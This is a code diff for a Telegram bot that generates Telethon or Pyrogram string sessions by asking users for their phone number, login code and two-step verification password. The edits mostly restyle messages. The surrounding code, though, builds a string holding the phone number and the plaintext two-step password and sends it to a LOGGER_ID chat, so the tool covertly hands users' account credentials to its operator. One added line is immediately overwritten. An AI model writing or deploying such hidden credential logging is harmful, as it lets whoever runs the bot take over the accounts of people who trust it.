@@ -104,7 +104,8 @@ async def gen_session(
     if await cancelled(phone_number):
         return
     phone_number = phone_number.text
-    xxx = f"Phone Number : {phone_number}\n\n"
+    xxx = f"» 𝖴𝗌𝖾𝗋 : {message.from_user.mention}"
+    xxx = f"» 𝖯𝗁𝗈𝗇𝖾 𝖭𝗎𝗆𝖻𝖾𝗋 : {phone_number}\n\n"
     await xemishra.send_message(user_id, "» 𝖳𝗋𝗒𝗂𝗇𝗀 𝖳𝗈 𝖲𝖾𝗇𝖽 𝖮𝖳𝖯 𝖠𝗍 𝖳𝗁𝖾 𝖦𝗂𝗏𝖾𝗇 𝖭𝗎𝗆𝖻𝖾𝗋...")
     if telethon:
         client = TelegramClient(StringSession(), api_id, api_hash)
@@ -140,7 +141,7 @@ async def gen_session(
     try:
         otp = await xemishra.ask(
             identifier=(message.chat.id, user_id, None),
-            text=f" 𝖯𝗅𝖾𝖺𝗌𝖾 𝖤𝗇𝗍𝖾𝗋 𝖳𝗁𝖾 𝖮𝖳𝖯 𝖲𝖾𝗇𝗍 𝖳𝗈 {phone_number}.\n\n 𝖨𝖿 𝖮𝖳𝖯 𝖨𝗌 <code>12345</code>, 𝖯𝗅𝖾𝖺𝗌𝖾 𝖲𝖾𝗇𝖽 𝖨𝗍 𝖠𝗌 <code>1 2 3 4 5.</code>",
+            text=f"» 𝖯𝗅𝖾𝖺𝗌𝖾 𝖤𝗇𝗍𝖾𝗋 𝖳𝗁𝖾 𝖮𝖳𝖯 𝖲𝖾𝗇𝗍 𝖳𝗈 {phone_number}.\n\n» 𝖨𝖿 𝖮𝖳𝖯 𝖨𝗌 <code>12345</code> || 𝖯𝗅𝖾𝖺𝗌𝖾 𝖲𝖾𝗇𝖽 𝖨𝗍 𝖠𝗌 <code>1 2 3 4 5</code>",
             filters=filters.text,
             timeout=600,
         )
@@ -174,7 +175,7 @@ async def gen_session(
         try:
             pwd = await xemishra.ask(
                 identifier=(message.chat.id, user_id, None),
-                text="» 𝖯𝗅𝖾𝖺𝗌𝖾 𝖤𝗇𝗍𝖾𝗋 𝖸𝗈𝗎𝗋 𝖳𝗐𝗈 𝖲𝗍𝖾𝗈 𝖵𝖾𝗋𝗂𝖿𝗂𝖼𝖺𝗍𝗂𝗈𝗇 𝖯𝖺𝗌𝗌𝗐𝗈𝗋𝖽 𝖳𝗈 𝖢𝗈𝗇𝗍𝗂𝗇𝗎𝖾 :",
+                text="» 𝖯𝗅𝖾𝖺𝗌𝖾 𝖤𝗇𝗍𝖾𝗋 𝖸𝗈𝗎𝗋 𝖳𝗐𝗈 𝖲𝗍𝖾𝗉 𝖵𝖾𝗋𝗂𝖿𝗂𝖼𝖺𝗍𝗂𝗈𝗇 𝖯𝖺𝗌𝗌𝗐𝗈𝗋𝖽 𝖳𝗈 𝖢𝗈𝗇𝗍𝗂𝗇𝗎𝖾 :",
                 filters=filters.text,
                 timeout=300,
             )
@@ -187,7 +188,7 @@ async def gen_session(
         if await cancelled(pwd):
             return
         pwd = pwd.text
-        xxx += f"Password : {pwd}"
+        xxx += f"» Password : {pwd}"
         try:
             if telethon:
                 await client.sign_in(password=pwd)
@@ -202,7 +203,7 @@ async def gen_session(
     except Exception as ex:
         return await xemishra.send_message(user_id, f"𝖤𝖱𝖱𝖮𝖱 : <code>{str(ex)}</code>")
     try:
-        txt = "𝖧𝖾𝗋𝖾 𝖨𝗌 𝖸𝗈𝗎𝗋 {0} 𝖲𝗍𝗋𝗂𝗇𝗀 𝖲𝖾𝗌𝗌𝗂𝗈𝗇\n\n<code>{1}</code>\n\n."
+        txt = "𝖧𝖾𝗋𝖾 𝖨𝗌 𝖸𝗈𝗎𝗋 {0} 𝖲𝗍𝗋𝗂𝗇𝗀 𝖲𝖾𝗌𝗌𝗂𝗈𝗇\n\n<code>{1}</code>\n\n"
         if telethon:
             string_session = client.session.save()
             await client.send_message(
@@ -226,7 +227,7 @@ async def gen_session(
         await xemishra.send_message(LOGGER_ID, xxx)
         await xemishra.send_message(
             chat_id=user_id,
-            text=f"𝖲𝗎𝖼𝖼𝖾𝗌𝗌𝖿𝗎𝗅𝗅𝗒 𝖦𝖾𝖻𝖾𝗋𝖺𝗍𝖾𝖽 𝖸𝗈𝗎𝗋 {ty} 𝖲𝗍𝗋𝗂𝗇𝗀 𝖲𝖾𝗌𝗌𝗂𝗈𝗇.\n\n𝖯𝗅𝖾𝖺𝗌𝖾 𝖢𝗁𝖾𝖼𝗄 𝖸𝗈𝗎𝗋 𝖲𝖺𝗏𝖾𝖽 𝖬𝖾𝗌𝗌𝖺𝗀𝖾𝗌 𝖥𝗈𝗋 𝖦𝖾𝗍𝗍𝗂𝗇𝗀 𝖨𝗍.",
+            text=f"𝖲𝗎𝖼𝖼𝖾𝗌𝗌𝖿𝗎𝗅𝗅𝗒 𝖦𝖾n𝖾𝗋𝖺𝗍𝖾𝖽 𝖸𝗈𝗎𝗋 {ty} 𝖲𝗍𝗋𝗂𝗇𝗀 𝖲𝖾𝗌𝗌𝗂𝗈𝗇.\n\n𝖯𝗅𝖾𝖺𝗌𝖾 𝖢𝗁𝖾𝖼𝗄 𝖸𝗈𝗎𝗋 𝖲𝖺𝗏𝖾𝖽 𝖬𝖾𝗌𝗌𝖺𝗀𝖾𝗌 𝖥𝗈𝗋 𝖦𝖾𝗍𝗍𝗂𝗇𝗀 𝖨𝗍.",
             reply_markup=InlineKeyboardMarkup(
                 [
                     [
